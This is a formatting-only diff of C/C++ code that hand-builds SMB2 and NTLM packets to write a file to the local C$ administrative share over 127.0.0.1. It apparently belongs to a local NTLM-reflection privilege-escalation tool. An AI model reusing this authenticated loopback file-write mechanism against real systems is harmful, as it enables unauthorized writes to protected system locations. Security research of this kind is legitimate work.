@@ -20,7 +20,7 @@ extern HANDLE event3;
 extern char SystemContext[];
 extern char UserContext[];
 
-BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t*, wchar_t*,wchar_t *);
+BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t*, wchar_t*, wchar_t*);
 SOCKET ConnectSocket(const wchar_t* ipAddress, int port);
 BOOL GenClientContext(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText);
 int findNTLMBytes(char* bytes, int len);
@@ -38,12 +38,12 @@ BOOL SMB2TreeDisconnect(SOCKET s, char* recBuffer, int& MessageID);
 void SMBAuthenticatedFileWrite()
 {
     SOCKET smbSocket = ConnectSocket(L"127.0.0.1", 445);
-    DoAuthenticatedFileWriteSMB(smbSocket, (wchar_t*)L"\\\\127.0.0.1\\c$", (wchar_t*)destfname, (wchar_t *)inputfname);
+    DoAuthenticatedFileWriteSMB(smbSocket, (wchar_t*)L"\\\\127.0.0.1\\c$", (wchar_t*)destfname, (wchar_t*)inputfname);
     closesocket(smbSocket);
 }
 
 
-BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_t *infile)
+BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_t* infile)
 {
     BOOL ret = FALSE;
     int MessageID = 2;
@@ -51,7 +51,7 @@ BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_
     SMBNegoProtocol(s, recBuffer);
     SMB2NegoProtocol(s, recBuffer);
     SMB2DoAuthentication(s, recBuffer, MessageID);
-    if(!SMB2TreeConnect(s, recBuffer, MessageID, path))
+    if (!SMB2TreeConnect(s, recBuffer, MessageID, path))
         return ret;
     SMB2CreateFileRequest(s, recBuffer, MessageID, fname);
     if (!SMB2WriteRequest(s, recBuffer, MessageID, infile, fname))
@@ -243,7 +243,7 @@ BOOL SMB2DoAuthentication(SOCKET s, char* recBuffer, int& MessageID) {
     return ret;
 }
 
-BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int *recBufferLen, CredHandle* hCred, struct _SecHandle* hcText) {
+BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int* recBufferLen, CredHandle* hCred, struct _SecHandle* hcText) {
     BOOL ret = TRUE;
     usmb2_header s2h;
     usmb2_data s2d;
@@ -309,8 +309,8 @@ BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int *recBuffer
     netsess[2] = slen.buffer[1];
 
     memcpy(finalPacket, netsess, 4);
-    memcpy(finalPacket+4, OutBuffer, start);
-    send(s, finalPacket, 4+start, 0);
+    memcpy(finalPacket + 4, OutBuffer, start);
+    send(s, finalPacket, 4 + start, 0);
     *recBufferLen = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
     return ret;
 }
@@ -404,7 +404,7 @@ BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int recBufferL
     return ret;
 }
 
-BOOL SMB2TreeConnect(SOCKET s, char* recBuffer, int& MessageID, wchar_t* path){
+BOOL SMB2TreeConnect(SOCKET s, char* recBuffer, int& MessageID, wchar_t* path) {
     BOOL ret = TRUE;
     myint mpid;
     usmb2_header s2h;
@@ -433,7 +433,7 @@ BOOL SMB2TreeConnect(SOCKET s, char* recBuffer, int& MessageID, wchar_t* path){
     memcpy(&sessid[0], &recBuffer[44], 8);
     memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
     memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
-    
+
     memset(netsess, 0, 4);
     netsess[3] = sizeof(s2h.buffer) + sizeof(trh) + wcslen(path) * 2;
 
@@ -456,7 +456,7 @@ BOOL SMB2TreeConnect(SOCKET s, char* recBuffer, int& MessageID, wchar_t* path){
     return ret;
 }
 
-BOOL SMB2CreateFileRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t *fname){
+BOOL SMB2CreateFileRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t* fname) {
     BOOL ret = TRUE;
     myint mpid;
     myshort us;
@@ -537,13 +537,13 @@ BOOL SMB2CreateFileRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t *f
     return ret;
 }
 
-BOOL SMB2WriteRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t* infile, wchar_t *fname) {
+BOOL SMB2WriteRequest(SOCKET s, char* recBuffer, int& MessageID, wchar_t* infile, wchar_t* fname) {
     BOOL ret = TRUE;
     myint mpid;
     myshort slen;
     usmb2_header s2h;
     unsigned char sessid[8];
-    char netsess[4];    
+    char netsess[4];
     char fileid[16];
     unsigned int* writeResponseStatus;
     u_write_request write_req;
@@ -624,7 +624,7 @@ BOOL SMB2CloseFileRequest(SOCKET s, char* recBuffer, int& MessageID) {
     unsigned char close_file[] = \
         "\x18\x00\x01\x00\x00\x00\x00\x00\x10\x00\x00\x00\x0a\x00\x00\x00" \
         "\x09\x00\x00\x00\x0a\x00\x00\x00";
-    
+
     memcpy(&sessid[0], &recBuffer[44], 8);
     mpid.i = GetCurrentProcessId();
     memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
@@ -648,7 +648,7 @@ BOOL SMB2CloseFileRequest(SOCKET s, char* recBuffer, int& MessageID) {
     memcpy(finalPacket, netsess, 4);
     memcpy(finalPacket + 4, s2h.buffer, sizeof(s2h.buffer));
     memcpy(finalPacket + 4 + sizeof(s2h.buffer), close_file, sizeof(close_file));
-    send(s, finalPacket, 4 + sizeof(s2h.buffer)+sizeof(close_file), 0);
+    send(s, finalPacket, 4 + sizeof(s2h.buffer) + sizeof(close_file), 0);
     // here we receive the return status of the Close File Request from SMB
     recv(s, recBuffer, DEFAULT_BUFLEN, 0);
     unsigned int* closeFileStatus = (unsigned int*)(recBuffer + 12);
@@ -690,8 +690,8 @@ BOOL SMB2TreeDisconnect(SOCKET s, char* recBuffer, int& MessageID) {
     memcpy(&s2h.smb2_header.TreeID[0], "\x01\x00\x00\x00", 4);
     memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
     memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
-    
-    memcpy(finalPacket, netsess+1, 3);
+
+    memcpy(finalPacket, netsess + 1, 3);
     memcpy(finalPacket + 3, s2h.buffer, sizeof(s2h.buffer));
     memcpy(finalPacket + 3 + sizeof(s2h.buffer), tree_disconnect, sizeof(tree_disconnect));
     send(s, finalPacket, 3 + sizeof(s2h.buffer) + sizeof(tree_disconnect), 0);
